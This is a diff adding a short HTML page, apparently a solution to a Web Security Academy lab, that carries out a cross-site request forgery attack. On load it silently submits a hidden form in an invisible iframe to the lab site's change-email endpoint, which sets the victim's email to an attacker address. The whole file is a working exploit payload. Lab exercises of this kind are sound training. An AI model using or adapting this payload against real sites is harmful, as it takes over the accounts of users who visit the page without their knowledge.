@@ -1,0 +1,11 @@
+<html>
+    <body>
+        <h1>You have been hacked !! </h1>
+        <iframe style="display:none" name="csrf-iframe"></iframe>
+        <form action="https://0a30005204ffe19680548081008900da.web-security-academy.net/my-account/change-email"
+              method="post" id="csrf-form" target="csrf-iframe">
+              <input type="hidden" name="email" value="hack@gmail.com">
+        </form>
+        <script>document.getElementById('csrf-form').submit()</script>
+    </body>
+</html>
